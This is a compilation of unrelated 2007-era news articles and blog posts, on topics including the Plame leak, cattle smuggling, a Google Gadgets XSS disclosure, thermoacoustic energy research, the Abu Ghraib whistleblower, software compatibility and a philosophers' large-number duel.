In his MTP appearance , Rove admits that there 's a discrepancy between his version of his conversation with Novak , and Novak's .
( Videotape , July 15 , 2007 ) MR .
RUSSERT : Then you go on to say , in the book , " Senior White House adviser Karl Rove returned my call late that afternoon [ July 8th , 2003 ] , " the same day .
" I mentioned I had heard that Wilson ’s wife worked at the CIA in the counterproliferation section and that she had suggested Wilson be sent to Niger .
I distinctly remember Rove ’s reply , ‘ Oh , you know that , too . ’
Rove and I also discussed other aspects of Wilson ’s mission , but since he never has disclosed them publicly , neither have I . "
So you considered Rove ’s comments , " Oh , you know that , too , " as a confirmation ?
MR .
ROBERT NOVAK : Yes .
( End videotape ) MR .
GREGORY : Were you a confirming source for Robert Novak ?
MR .
ROVE : No .
And I , I remember it slightly differently .
I remember saying , " I ’ve heard that , too . "
Let , let me say this .
There is a civil lawsuit filed by Mr. Wilson and Ms. Plame .
It has been tossed out at the district court level .
They ’ve announced their intention to appeal .
I think it is better that I not add anything beyond what is already in the public record until that suit is resolved .
But , as I ’m — my recollection is that I said , " I heard that , too . "
We — I would point you to ... [ my emphasis ]
And then when , on Fox News , Chris Wallace presses Rove on his leak to Cooper , Rove gets all squirmy :
ROVE : Well , it 's been dismissed , but they 've announced they intend to appeal .
And so I 'm not going to add anything to the public record .
What I did say to one reporter was , " I 've heard that , too . "
And what I said to another reporter , off the record , was , in essence , " I do n't think you ought to be writing about this .
" And you know , we 'll — I intend to hold my fire and not add anything else to the public record until after this is over .
WALLACE : Matt Cooper , the second reporter you 're talking about , who then worked for Time , says you told him that Joe Wilson 's wife , who worked for the CIA , authorized the trip .
ROVE : Which I had been told by a reporter .
WALLACE : But did you tell that to Matt Cooper ?
ROVE : I 'm going to let — I do n't recall Mr. Cooper 's conversation .
I 'll let his notes stand as a record of it .
[ my emphasis ]
What a remarkable coincidence !
Both Libby and Rove , when questioned by investigators , claimed that they first learned of Valerie Wilson 's identity from a reporter , and then passed it on , as if they had learned it from a reporter .
And when Wallace calls Rove on whether he claimed to have said as much to Cooper , Rove punts , getting all quiet .
Because Rove knows that the only thing that saved him from Libby 's fate is the fact that he did n't offer up the details about the Cooper conversation , which would have required him to claim the " I heard it from a reporter " dodge that did Libby in .

Indian border guards say cattle smuggling to Bangladesh is thriving
Border Security Force ( BSF ) spokesman GK Sharma said the move was meant to stop smuggling of cattle from India to neighbouring Bangladesh .
Mr Sharma said thousands of cows were smuggled every day from West Bengal .
India prohibits cattle exports , as beef consumption is frowned upon by the country 's majority Hindu population .
Thousands of villagers in the state 's Murshidabad district bordering Bangladesh are queuing up outside photo studios to have their cows photographed for the identity cards .
Some cattle identity cards have already been issued in the district 's border villages .
BSF officials in Calcutta say if the pilot project works well in Murshidabad , where cattle smuggling is at its highest , the scheme could be extended to other border districts .
Smuggling networks
Local estimates say that between 20,000 and 30,000 cows are smuggled into Bangladesh every day from India , mostly through the state of West Bengal .
These ID cards can help us easily identify the cattle brought for smuggling
Surinder Singh ,
Indian Border Security Force official
Exporting cattle is illegal in India , but cows are smuggled in large numbers to Bangladesh and Pakistan regularly , primarily for beef .
The smuggling is at its highest during Muslim festivals .
Traffickers bring the cows by truck to West Bengal from as far as Haryana and Punjab in northern India .
" The traffickers have a strong network in the border villages , where the cattle are kept in transit , before being sent across the border , " said BSF official in Murshidabad , Surinder Singh .
" Locals are paid for that , so they have a vested interest in the smuggling .
These ID cards can help us easily identify the cattle brought for smuggling . "
People in border villages say having their cattle photographed is a problem because it requires them to take time off work .
But they have agreed to the identity cards to avoid harassment by the BSF and police who often raid villages in search of cattle waiting to be smuggled to Bangladesh slaughterhouses .
Authorities say crime syndicates find it easy to tamper with branding or tattooing of the cattle - hence the idea for photo identity cards which should be difficult to falsify .
Valid for two years , each laminated cattle ID card displays the picture of the animal and its owner .
It also carries vital information about the animal , such as its colour , height , sex and length of horns .
It carries the owner 's name and address and sometimes other details about the animal - like one " horn missing " or " half tail lost " .

Today RSnake revealed a cross site scripting vulnerability affecting Google Gadgets in the gmodules.com domain .
This XSS hole allows anybody to store his / her own web content , including JavaScript code , anywhere and to have it rendered and executed in the context of the gmodules.com domain , with no further validation of sort .
RSnake responsibly reported his finding to Google before resorting to public disclosure , but the G guys answered that this behavior is " by design " and wo n't be fixed .
What does it mean ?
For the average user , such a vulnerability means that phishers can effectively exploit a site owned by Google as a free hosting facility , making quite impractical blacklisting and / or shutting down the scam : do n't forget Firefox 's built - in anti-phishing blacklist is provided by Google itself .
For NoScript users , it means that if you allow gmodules.com to execute scripts , you 're trusting not just Google , as you may misled to believe , but everyone in the cyberworld -- even the most evil hackers like my RSnake friend ;) -- to run his / her code inside your browser .
The bottom line is : until Google security crew changes its mind and decides to rethink or remove this " feature " , do not whitelist gmodules.com -- even better , mark gmodules.com as untrusted .
If you absolutely need scripts from the gmodules.com domain , e.g. to use those so called mapplets ( another nifty Web 2.0 marvel ) , just " Temporarily allow " it and cross your fingers .
On a side note , U.N. site is still vulnerable to defacement ...

University of Utah physicists developed small devices that turn heat into sound and then into electricity .
The technology holds promise for changing waste heat into electricity , harnessing solar energy and cooling computers and radars .
" We are converting waste heat to electricity in an efficient , simple way by using sound , " says Orest Symko , a University of Utah physics professor who leads the effort .
" It is a new source of renewable energy from waste heat . "
University of Utah physicist Orest Symko holds a match to a small heat engine that produces a high - pitched tone by converting heat into sound .
Symko's research team is combining such heat engines with existing technology that turns sound into electricity , resulting in devices that can harness solar energy in a new way , cool computers and other electrical devices .
Credit : University of Utah
Five of Symko ’s doctoral students recently devised methods to improve the efficiency of acoustic heat - engine devices to turn heat into electricity .
They will present their findings on Friday , June 8 during the annual meeting of the Acoustical Society of America at the Hilton Salt Lake City Center hotel .
Symko plans to test the devices within a year to produce electricity from waste heat at a military radar facility and at the university ’s hot - water - generating plant .
The research is funded by the U.S. Army , which is interested in " taking care of waste heat from radar , and also producing a portable source of electrical energy which you can use in the battlefield to run electronics " he says .
Symko expects the devices could be used within two years as an alternative to photovoltaic cells for converting sunlight into electricity .
The heat engines also could be used to cool laptop and other computers that generate more heat as their electronics grow more complex .
And Symko foresees using the devices to generate electricity from heat that now is released from nuclear power plant cooling towers .
How to Get Power from Heat and Sound
Symko ’s work on converting heat into electricity via sound stems from his ongoing research to develop tiny thermoacoustic refrigerators for cooling electronics .
In 2005 , he began a five - year heat - sound - electricity conversion research project named Thermal Acoustic Piezo Energy Conversion ( TAPEC ) .
Symko works with collaborators at Washington State University and the University of Mississippi .
The project has received $ 2 million in funding during the past two years , and Symko hopes it will grow as small heat - sound - electricity devices shrink further so they can be incorporated in micromachines ( known as microelectromechanical systems , or MEMS ) for use in cooling computers and other electronic devices such as amplifiers .
Using sound to convert heat into electricity has two key steps .
Symko and colleagues developed various new heat engines ( technically called " thermoacoustic prime movers " ) to accomplish the first step : convert heat into sound .
Then they convert the sound into electricity using existing technology : " piezoelectric " devices that are squeezed in response to pressure , including sound waves , and change that pressure into electrical current .
" Piezo " means pressure or squeezing .
Most of the heat - to - electricity acoustic devices built in Symko ’s laboratory are housed in cylinder - shaped " resonators " that fit in the palm of your hand .
Each cylinder , or resonator , contains a " stack " of material with a large surface area – such as metal or plastic plates , or fibers made of glass , cotton or steel wool – placed between a cold heat exchanger and a hot heat exchanger .
When heat is applied – with matches , a blowtorch or a heating element – the heat builds to a threshold .
Then the hot , moving air produces sound at a single frequency , similar to air blown into a flute .
" You have heat , which is so disorderly and chaotic , and all of a sudden you have sound coming out at one frequency , " Symko says .
Then the sound waves squeeze the piezoelectric device , producing an electrical voltage .
Symko says it ’s similar to what happens if you hit a nerve in your elbow , producing a painful electrical nerve impulse .
Longer resonator cylinders produce lower tones , while shorter tubes produce higher - pitched tones .
Devices that convert heat to sound and then to electricity lack moving parts , so such devices will require little maintenance and last a long time .
They do not need to be built as precisely as , say , pistons in an engine , which loses efficiency as the pistons wear .
Symko says the devices wo n’t create noise pollution .
First , as smaller devices are developed , they will convert heat to ultrasonic frequencies people cannot hear .
Second , sound volume goes down as it is converted to electricity .
Finally , " it ’s easy to contain the noise by putting a sound absorber around the device , " he says .
Studies Improve Efficiency of Acoustic Conversion of Heat to Electricity
Here are summaries of the studies by Symko ’s doctoral students :
-- Student Bonnie McLaughlin showed it was possible to double the efficiency of converting heat into sound by optimizing the geometry and insulation of the acoustic resonator and by injecting heat directly into the hot heat exchanger .
She built cylindrical devices 1.5 inches long and a half - inch wide , and worked to improve how much heat was converted to sound rather than escaping .
As little as a 90 - degree Fahrenheit temperature difference between hot and cold heat exchangers produced sound .
Some devices produced sound at 135 decibels – as loud as a jackhammer .
-- Student Nick
Webb showed that by pressurizing the air in a similar - sized resonator , it was able to produce more sound , and thus more electricity .
He also showed that by increasing air pressure , a smaller temperature difference between heat exchangers is needed for heat to begin converting into sound .
That makes it practical to use the acoustic devices to cool laptop computers and other electronics that emit relatively small amounts of waste heat , Symko says .
-- Numerous heat - to - sound - to - electricity devices will be needed to harness solar power or to cool large , industrial sources of waste heat .
Student Brenna Gillman learned how to get the devices – mounted together to form an array – to work together .
For an array to efficiently convert heat to sound and electricity , its individual devices must be " coupled " to produce the same frequency of sound and vibrate in sync .
Gillman used various metals to build supports to hold five of the devices at once .
She found the devices could be synchronized if a support was made of a less dense metal such as aluminum and , more important , if the ratio of the support ’s weight to the array ’s total weight fell within a specific range .
The devices could be synchronized even better if they were " coupled " when their sound waves interacted in an air cavity in the support .
-- Student Ivan Rodriguez used a different approach in building an acoustic device to convert heat to electricity .
Instead of a cylinder , he built a resonator from a quarter - inch - diameter hollow steel tube bent to form a ring about 1.3 inches across .
In cylinder - shaped resonators , sound waves bounce against the ends of the cylinder .
But when heat is applied to Rodriguez ’s ring - shaped resonator , sound waves keep circling through the device with nothing to reflect them .
Symko says the ring - shaped device is twice as efficient as cylindrical devices in converting heat into sound and electricity .
That is because the pressure and speed of air in the ring - shaped device are always in sync , unlike in cylinder - shaped devices .
-- Student Myra Flitcroft designed a cylinder - shaped heat engine one - third the size of the other devices .
It is less than half as wide as a penny , producing a much higher pitch than the other resonators .
When heated , the device generated sound at 120 decibels – the level produced by a siren or a rock concert .
" It ’s an extremely small thermoacoustic device – one of the smallest built – and it opens the way for producing them in an array , " Symko says .

Producer , BBC Radio 4's The Choice
Joe Darby was commended by the military for his actions
A soldier 's dilemma
When Joe Darby saw the horrific photos of abuse at Abu Ghraib prison he was stunned .
So stunned that he walked out into the hot Baghdad night and smoked half a dozen cigarettes and agonised over what he should do .
Joe Darby was a reserve soldier with US forces at Abu Ghraib prison when he stumbled across those images which would eventually shock the world in 2004 .
They were photographs of his colleagues , some of them men and women he had known since high school - torturing and abusing Iraqi prisoners .
His decision to hand them over rather than keep quiet changed his life forever .
The military policeman has only been allowed to talk about that struggle very recently , and in his first UK interview , for BBC Radio 4's
The Choice , he told Michael Buerk how he made that decision and how he fears for the safety of his family .
Photos of abuse
He had been in Iraq for seven months when he was first handed the photographs on a CD .
It was lent to him by a colleague , Charles Graner .
I knew that some people would n't agree with what I did ...
They view it as - I put American soldiers in prison over Iraqis
Joe Darby
Most of the disc contained general shots around Hilla and Baghdad , but also those infamous photos of abuse .
At first he did not quite believe what he was looking at .
" The first picture I saw , I laughed - because one , it 's just a pyramid of naked people - I did n't know it was Iraqi prisoners , " he says .
" Because I have seen soldiers do some really stupid things .
As I got into the photos more I realised what they were .
" There were photos of Graner beating three prisoners in a group .
There was a picture of a naked male Iraqi standing with a bag over his head , holding the head , the sandbagged head of a male Iraqi kneeling between his legs .
" The most pronounced woman in the photographs was Lynndie England , and she was leading prisoners around on a leash .
She was giving a thumbs - up and standing behind the pyramid , you know with the thumbs - up , standing next to Graner .
Posing with one of the Iraqi prisoners who had died . "
Promised anonymity
Joe Darby knew what he saw was wrong , but it took him three weeks to decide to hand those photographs in .
When he finally did , he was promised anonymity and hoped he would hear no more about it .
Mr Darby feared repercussions from the soldiers in the photos
But he was scared of the repercussions from the accused soldiers in the photos .
" I was afraid for retribution not only from them , but from other soldiers , " he says .
" At night when I would sleep , they were less than 100 yards from me , and I did n't even have a door on the room I slept in .
" I had a raincoat hanging up for a door .
Like I said to my room mate , they could reach their hand in the door - because I slept right by the door - and cut my throat without making a noise , or anybody knowing what was going on , and I was scared of that . "
When the accused soldiers were finally removed from the base , he thought his troubles were over .
And then he was sitting in a crowded Iraqi canteen with hundreds of soldiers and Donald Rumsfeld came on the television to thank Joe Darby by name for handing in the photographs .
" I do n't think it was an accident because those things are pretty much scripted , " Mr Darby says .
" But I did receive a letter from him which said he had no malicious intent , he was only doing it to praise me and he had no idea about my anonymity .
" I really find it hard to believe that the secretary of defence of the United States has no idea about the star witness for a criminal case being anonymous . "
Rather than turn on him for betraying colleagues , most of the soldiers in his unit shook his hand .
It was at home where the real trouble started .
Labelled a traitor
His wife had no idea that Mr Darby had handed in those photos , but when he was named , she had to flee to her sister 's house which was then vandalised with graffiti .
Many in his home town called him a traitor .
" I knew that some people would n't agree with what I did , " he says .
" You have some people who do n't view it as right and wrong .
They view it as : I put American soldiers in prison over Iraqis . "
That animosity in his home town has meant that he still cannot return there .
After Donald Rumsfeld blew his cover , he was bundled out of Iraq very quickly and lived under armed protection for the first six months .
He has since left the army but did testify at the trials of some of those accused of abuse and torture .
It is Charles Graner he is most afraid of .
" Seeing Graner across the courtroom was the only one that was difficult during the trial , " he says .
" He had a stone - cold stare of hatred the entire time - he would n't take his eyes off me the whole time he sat there .
I think this is a grudge he will hold till the day he gets out of prison . "
Mr Darby and his family have moved to a new town .
They have new jobs .
They have done everything but change their identities .
But he does not see himself as a hero , or a traitor .
Just " a soldier who did his job - no more , no less " .
" I 've never regretted for one second what I did when I was in Iraq , to turn those pictures in , " he says .
You can hear Joe Darby being interviewed by Michael Buerk on BBC Radio 4's The Choice on 7 August at 0900 BST .
たまには、ざっくばらんに書かせてもらいます。
結 変えようとするところが，スゴイと思います。変えないほうが楽ですよね。
私には全く信じがたい言葉です。 まともなソフトウェア開発をやっている人間なら、決してこんな言葉は吐かないはず。
普通、ソフトウェア開発をやっている人間には次のパターンが存在するように思います。
もう関心がないので、実は放置したいと思っているか、実際にそうしている。
やる気あり。どんどん改善できるところはやりたい。でも既存のユーザを無視できないので、そう簡単には変更できない。
やる気あり。もういっぱい変えたくてたまらないし、実際にそうしている。ユーザなんて知ったことではない。
私が思うに、結城さんが言っているのは最初のパターンで、
こんなのはまともな状態とは言えないのだから、
変えない方が楽とかじゃなくって、何もしないのが楽って言っているだけです。 放置プレイ。 そんなのは開発とは言えません。
大体において、開発というものは最初の頃が一番楽しいものですが、
それは三番目のパターンが簡単に適用できるからです。
そもそも利用しているユーザがいない状態なのだから、
変えようが変えまいが、気にする必要もないわけです。
しかしこれを本当に使われている状況でやられては、たまったもんじゃありません。
それと同時に、開発を多少なりとも経験している人なら分かるように、
互換性に注意して改善するのは、相当気を配る必要があり、
制約も厳しくて、大変な作業です。 変える方が楽なんです。 それはもう、圧倒的に。
それでもやる価値あるのは、いわゆる最大多数の幸福の法則などが理由にあげられるのでしょう。
大変だとは言っても、所詮1〜数人のコア開発者が苦労すれば、何万というユーザが助けられる勘定になるから。
作っている人のハッピーよりも、使っている人のハッピーの方が、総量として大きいという考え方。
だから、まともな開発者なら、いかに「変えながら変えないか」を考えます。
具体的な方法論はさまざまあるでしょうが、
例えば、互換性を保ちながら拡張するとか、
新しい記法を導入するけど古いのもサポートするとか、
バージョンできれいに分けてしまってユーザにも少し苦労を肩代わりしてもらうとか、 そんなところでしょう。
とにかく、作っている人が変えたくなるのは当たり前の話。
一番欠陥の見える位置にいるんだから。 そこを変えないように改善できて、なんぼのもんです。
さて、並列化のお話 。
ま 個人的にはもっと自動的にやって欲しいんですけど。人間が考えることはできるだけ最小限にとどめて，あとはコンピュータがよしなに計らってくれる，というのが好みなんです。
私は根本的に脳味噌が古いのか、あるいは、近視眼的になっていて、将来の変化が見通せていないのか、思い切り外しているという可能性は大いにありますが、
どうもこの話題には悲観的な見解しか持ち合わせてません。
ちゃんとした話を書こうとすると、少々大変なので、かなりはしょって書いてしまいますが、
少なくとも現在のコンピュータでは、何が内部で行われているのかを理解せずに済ませられるほど、性能がよろしくありません。
ディスクI/Oは恐ろしく遅いし、ネットワークI/Oも相当遅いし、 ネックがCPUにはほとんどならない。
そりゃ一部の科学計算（という用語も何だかあれだけど）ではそういうこともあるけれど、
私のよく知る範囲では、そういう例は極めて稀です。
コアが増えたからと言って、単一ノードで収まったりはしなくて、
分散化が必須という状況では、 言語なり処理系なりが透過的な機能を提供して、それで本当に嬉しいの？と思うのです。
そりゃあ、中にはいわゆるバカチョンパラレルで十分なケースもあるわけで、
そういう時には嬉しいのかもしれません。
でもそれだけでは困る場面というのは、無視できない程度には多々発生します。
そういうときに、うーん、一体何がどうなっているんだろうと悩み、
そこに人間が介入できるかどうかを悩み、
事態がややこしいことになるぐらいなら、 私はもろなインターフェースが見えている方が嬉しいと感じます。
それはそれとして、また別の考え。 仮に、いっぱいコアなマシンが普及したとします。
例えば、8コアになったとしましょう。 全部のコアが単一のプログラムのために費されるのもどうかとは思いますが、
とりあえず全リソースを投入したとして、
それでも最大8倍にしかならんのですよね？
そこまで線形に増大するとも思えないけれど、 ここは楽観的になるとしましょう。
で、この8倍とはいうのは、CPUに関する部分だけなわけですよね？
つまり、この恩恵を受けられるのは、CPUがボトルネックになるようなプログラムだけなんですよね？ でもね、CPUがネックになるようなタイプのプログラムなら、 そこをCで書き直した方がたったの1コアでも、もっと速くなるんじゃないですか？
Rubyでそういうプログラムを書く意味って、どれぐらいあるんですか？
より開発効率の良い言語で、速度の向上が見込めるところに意味がある、 のかもしれません。 でも、その結果が、たくさん電力を消耗して発熱量を増大させて、その挙句、結局Cより遅いです、では、ちょっとね。
あるいは、信じがたい数のコア数になれば、とんでもないことになるぞ、という話なのかもしれません。
例えば、4096コアとかになれば、確かにすごいことになるのかもしれません。 でもねえ、Rubyのような動的言語のメモリ効率がよろしくないという状況が今後改善されるようには思えないから、
キャッシュ効率も悪くって、急激にスケーラビリティが落ちていくようにしか思えないんですよね。
こっちは何一つデータを持ち合わせてないので、因縁をつけているような気もするのが申し訳ないですが、
誰かシミュレータとかで計測したりしているんでしょうか。
個人的には、コンピュータが何でもよしなにはからってくれる、という構図は全然信じてなくって、結局人間が面倒を見ないといけないことは随分多いと感じています。 O/Rマッパーが嫌いなのと同じ感じ。 それでも済む程度のしょぼいレベルならともかく、
そうじゃなくなったときに、より一層苦労させられるような隠蔽化は邪魔ものでしかなくって、
それなら初めからない方がマシっていう。
とは言いつつ、dRubyに毛が生えたような程度のものがあったら、案外便利な場面もあるかもなあと思ったり。
何が起きているかはっきり分かるようなものがいいな。

The vegetable garden will save us money
Sounds like a truthful statement does n’t it ?
Yes , honey we wo n’t have to buy that $ 1.99 bag of salad at the supermarket because I can buy a packet of seeds for the same price .
Please ignore the cost of the potting soil , the self watering seed starting trays , the electricity from the lights used to start these seeds in the basement , the water bill , the cost of lumber to build those raised beds , the fencing …
There ’s a discount when you buy more than 18 yards of mulch
Who wants a few bags of mulch when you can have a dump truck unload a gigantic pile in your driveway .
It 's like a giant billboard that says , " Neighbors of NJ , behold my mighty pile of mulch ! "
No , I did n’t just buy that plant , it was already there
Do n’t you remember last year , we went to the nursery together , I think you picked that one out .
What ’s that ?
No , I do n’t know where that receipt came from .

AMD to open up graphics specs
A quick report from the kernel summit : AMD 's representative at the summit has announced that the company has made a decision to enable the development of open source drivers for all of its ( ATI ) graphics processors from the R500 going forward .
There will be specifications available and a skeleton driver as well ; a free 2D driver is anticipated by the end of the year .
The rest will have to be written ; freeing of the existing binary - only driver is not in the cards , and " that is better for everybody . "
Things are looking good on this front .
More in the kernel summit report to come .
Update : Christopher Blizzard has posted some more information about what AMD is doing .
British and Nato defence officials have consistently expressed concern about US tactics , notably air strikes , which kill civilians , sabotaging the battle for " hearts and minds " and infuriating Hamid Karzai , the Afghan president .
Des Browne , the defence secretary , recently raised the issue with Robert Gates , his US counterpart , and Jaap de Hoop Scheffer , Nato 's secretary general , admitted last month that an increasing number of civilian casualties was undermining support for alliance troops .
He said Nato commanders had changed the rules of engagement , ordering their troops to hold their fire in situations where civilians appeared to be at risk .
Today , a senior British commander was quoted in the New York Times as saying that in Sangin , in the north of Helmand province , which had been calm for a month , there was no longer a need for special forces .
" There are n't large bodies of Taliban to fight any more , " he said .
" We are dealing with small groups and we are trying to kick - start reconstruction and development . "
Twelve - man teams of US special forces had been criticised for relying on air strikes for cover when they believed they were confronted by large groups of Taliban fighters and their supporters .
Unnamed British officers were quoted today as saying the US had caused the lion 's share of casualties in their area and that after 18 months of heavy fighting since British forces arrived in Helmand they were finally making headway in securing key areas , but were now trying to win back support from people whose lives had been devastated by bombing .
The newspaper estimated the number of civilian casualties this year in Helmand at close to 300 - most caused by foreign and Afghan forces , not the Taliban .
Human rights and aid groups estimate that 230 Afghan civilians were killed throughout the south of the country last year .
Nato officers admit they are troubled by the high toll .
One medic told the Guardian that during a 14 - day period last month , British soldiers rescued 30 Afghan civilians wounded in bombings or firefights - half of whom were children .
The US and Nato today denied the British commander had asked US special forces to leave his area of operations .
However , Mr Browne , visiting British and Nato troops in Afghanistan , said the commander was expressing a personal view .
" It is the reporting of an observation of a British officer on a particular part of the American military , " he told reporters in Kabul .
" That may be his view , but it is not the view of the Helmand taskforce commander , it is not the view of our government , it is not the view of the Americans , it is not the view of the alliance .
These things can be said in the heat of battle .
These are very difficult circumstances . "
After a meeting with Mr Karzai , Mr Browne said the British - led Helmand force has made " enormous progress in driving back the Taliban in the north of the province " .
He added : " The forces ' progress has been followed by targeted development projects that are making a difference to ordinary Afghans ' lives . "
British officers say US special forces are cavalier in their approach to the civilian population .
The tensions were illustrated by an incident the Guardian witnessed in Sangin earlier this summer .
A British patrol was abandoned by its American special forces escort in the town for several hours .
Stranded in central Sangin , British officers tried to establish radio contact with the Americans , who had disappeared without warning , and swore impatiently when they could not .
The British criticisms intensified after the Americans led them to their proposed site for a new Afghan patrol base in the town - beside a graveyard and a religious shrine .
" Sensitivity is not their strong suit , " said one British officer .
Most British soldiers work well with regular American troops and some speak admiringly of them .
But US special forces units are a different matter .
They operate under a different chain of command , with their own rules on everything from dress code to the use of weapons .
Whereas the British troops operate under Nato command , American special forces are commanded by the US - led coalition in Bagram airbase outside Kabul .
That means the Americans can call on a wider range of airstrikes , and also that British officers have little control over which munitions are dropped in populated areas .
The British military spokesman in Helmand , Lt Col Charlie Mayo , said the special forces had supported seven British - led operations in Helmand since last April .
He said that relations between the two sides were " excellent " .
" To work together effectively we have to have bloody good cooperation and we have to mutually support each other , " he said .
Col Mayo stressed that the British commander who had a problem with special forces had requested them to leave Sangin town only , not all of Helmand .
Officers also argue that where Taliban fighters mount ambushes from inside heavily populated areas , civilian deaths are unavoidable .
" When you are working in a high intensity counter - insurgency environment like this , regrettably you are going to have civilian casualties , " Col Mayo said .
In London , British officials confirmed UN forecasts that southern Afghanistan 's opium poppy crop , based in Helmand , will exceed last year 's record .
Foreign Office minister Lord Malloch Brown described the figures as " extremely disappointing " .

Profs Duke It Out in Big Number Duel
Two Philosophers Vie to Write Largest Possible Finite Number on Chalkboard
By Mandana T. Manzari
Dr. Evil clutched his heart as though it had been pierced by an arrow .
Trembling , he fell to his knees on the floor of the crowded stuffy room , all eyes watching him .
The Mexican Multiplier threw up his hands in victory , smiling , as Dr. Evil whispered , “ I ’ve been crushed . ”
The battle was finally over .
On Friday , Jan. 26 , two philosophers , MIT Associate Professor Agustin Rayo ( The Mexican Multiplier ) and Princeton Associate Professor Adam N. Elga ( Dr. Evil ) engaged in the Large Number Duel , in which they attempted to one - up each other by inscribing the largest finite number ever to be written on an ordinary - sized chalkboard .
The feat , if successfully accomplished , would be worthy of a note in the Guinness Book of World Records .
The Large Number Duel required the use of logic , numerical tricks , and philosophical wit .
The use of philosophy is “ crucial , ” Rayo said .
“ The limit of math ability was reached at the end .
Knowing a bit of philosophy , that was the key . ”
“ The philosophical debate - turned - boxing - match really opened my eyes to some of the cool math - related things that the Philosophy Department here does , ” Quentin E. Smith ’ 10 said .
“ They were able to invoke all sorts of esoteric constructions in their quest to write a bigger number .
I also enjoyed when they referenced the Busy Beaver function . ”
The rules of the duel gave free rein to the contestants ’ creativity and humor , maintaining only a ban on the use of infinity , and restricting statements about the number proposed to a primitive semantic vocabulary .
The battle itself was intense and the room in the Dreyfoos wing of the Stata Center was packed , with people standing on chairs and at least 20 students craning their necks from the doorway .
The contest opened in the style of a boxing match , with competitors presented “ in the red corner ” and “ in the blue corner . ”
Elga went first , writing the number one .
“ Ha ! ” announced Rayo , as he countered with a string of ones across the board .
Elga retaliated with a clever trick , erasing a line through the base of half of the ones to turn them into factorials .
As the battle continued , the contestants began defining their own functions .
Moments into their definitions , a student raised her hand and asked Elga if the operation he had written on the board was even computable .
Elga cleared his throat , smiled and succinctly replied , “ No . ”
Functions became more and more complicated , at one point prompting the announcer to proclaim , “ It looks like there are words in your number . ”
Near the end of the duel , Rayo furiously scribbled on the whiteboard : “ The smallest number bigger than any number that can be named by an expression in the language of first order set - theory with less than a googol ( 10100 ) symbols . ”
Although this definition took a bit of tweaking , including what Rayo described as his “ second order logic trick , ” it soon won him the duel .
As Elga collapsed , slain , the referee closed the ceremony .
“ It was a great game , ” Elga said .
“ Heated at times , but nevertheless , a really great game . ”
After the battle , when asked if he thought he set the Guinness record , Dr. Rayo said “ It ’s hard to be sure , but the number is bigger than any number I have ever seen . ”
Although it is unclear whether the competitors succeeded in setting a new record , they did succeed in entertaining audience members with their antics .
“ My favorite part of the battle was , I have to say , the melodramatics of the two competitors , ” Smith said .
“ They played up their toil .
At one point , the MIT contestant walked away and leaned his head against the wall in shame .
The referee started to count down , and then the contestant turned around and said “ wait a minute ! ” and then turned back and forth as he attempted to figure out whether he could truly write a larger number . ”
Despite the fact that his large number led him to victory against his graduate school friend Elga , Rayo said in an interview after the game that his favorite number is 19 .
“ It has to be prime , of course , ” he said matter - of - factly .
Staff Reporter Nick Semenkovich contributed to the reporting of this article .
In June I decided to do a 30 - day trial of no TV watching .
DVDs were OK , but I was n’t going to watch any regular programming or cable shows or tape anything with my DVR .
At the end of the 30 - day trial , I was pleased with the results , so I kept going .
Now that it ’s been over 60 days , I thought I ’d share my observations on life without TV .
1. Becoming more aware of the TV ’s presence
The rest of my family did n’t join me in this experiment , so there was still some TV viewing in our home .
When I stopped watching TV , I became much more aware of the TV ’s presence when others were watching it .
I began finding the TV a noisy nuisance , and I starting encouraging the rest of the family to keep the TV turned off during mealtimes .
2. Noticing TV ’s presence outside the home
When I went to the gym , I really began noticing all the video monitors and TVs .
My gym has flat - panel TVs with individual remotes at most of the cardio exercise stations .
I never liked watching TV while exercising , so I always turned mine off — I listen to audio programs on my iPod instead .
But I began noticing how many other people in the gym would watch TV .
Many of those people literally looked hypnotized .
The whole thing started creeping me out , like I was exercising with a bunch of mass - hypnotized zombies who came to ingest their social conditioning for the day .
It reminded me of the movie The Island .
3. Saving time
I used to watch recorded shows during lunch , so without the TV , I would eat lunch faster , often finishing in 10 - 20 minutes instead of 30 - 60 .
This gave me some extra time in the middle of my day , which I liked .
With no TV in the evenings , I started reading more , going out more , and spending more time talking to Erin .
I found all of these more enjoyable than watching TV .
4. Expanding socially
I ’m not exactly sure why , but I felt a compulsion to expand socially , which seemed to grow stronger the longer I went without TV .
I just wanted to spend more time with real people , especially face - to - face .
I started talking on the phone more , going to more social outings , and accepting more dinner / lunch invitations .
I also accepted a couple new speaking engagements that I was previously hesitant to accept .
I find myself wanting to do something socially almost every day now .
Today Erin and I enjoyed an almost 3 - hour lunch with a local entrepreneur couple .
Tonight we have our weekly psi discussion group .
Tomorrow morning I ’m playing disc golf with a friend .
Friday I ’m attending a weekly self - improvement group meeting .
Saturday Erin and I are attending a 4 - hour Reiki workshop , and then we ’re going to see a live show with the kids .
I ’ve always enjoyed social activities , but my social calendar has filled in a lot more lately , and I ’m really loving this expansion .
I think excessive internet socialization can have the same negative impact as TV — it fills a void , but there ’s just no substitute for talking to people face - to - face .
No TV show can compete with a stimulating conversation .
5 . Seeking higher quality entertainment
TV also fills a desire for entertainment .
With the TV turned off , I finally woke up to the thought , “ Wait a minute here — I ’m living in Las Vegas , and I ’ve only seen a fraction of the shows here . ”
So I said to Erin , “ Let ’s go see some shows on the Strip . ”
Over the next few months , we plan to see a lot more of the wonderful shows in town .
I ’m especially looking forward to seeing Cirque du Soleil ’s O .
When I compare a live Vegas show to watching TV , TV just ca n’t compete .
6 . Feeling more ambitious
Over the past couple months , I ’ve been feeling a lot more ambitious about growing my business and especially reaching out to help more people .
I accepted a few more speaking engagements , and I ’m open to accepting more .
Recently I ’ve been talking to publishers about possible book deals and other companies about various partnering opportunities .
I ’m also planning to start offering public workshops .
These ideas were always part of my original plan , but now they ’re really starting to come together .
7. Spending less time on the computer
Giving up TV made me question how much time I spend in front of my PC .
I ’ve been cutting back on my online activities and tackling more offline projects , such as finally upgrading my pathetic office furniture .
And as previously mentioned , I ’m going out a lot more .
Spending a whole day at my desk just does n’t feel as comfortable anymore — I have a much stronger urge to go outside or at least to get away from my desk .
8 . Not missing TV
I found this a surprisingly easy habit to break .
I just went cold turkey instead of gradually weaning myself , and I perceived no withdrawal symptoms .
You might think “ giving up ” TV means sacrifice , but in my experience it ’s just the opposite .
Watching TV means sacrificing social outings , better forms of entertainment , and of course time .
I ’m really glad to have made this change .
In terms of results , it ’s right up there with becoming an early riser .
There is
no - doubt that the C #2 nullable - types
is a cool feature .
However I regret that C# do n’t support the other
half of the paradigm : the non-nullable types .
The same
way as nullable - types allow null values for value - types , non-nullable types forbid
null references for reference types .
In
the following example the method AcceptNonNullString ( string ! ) takes a non-nullable
string as parameter .
static void AcceptNullString ( string
s ) {
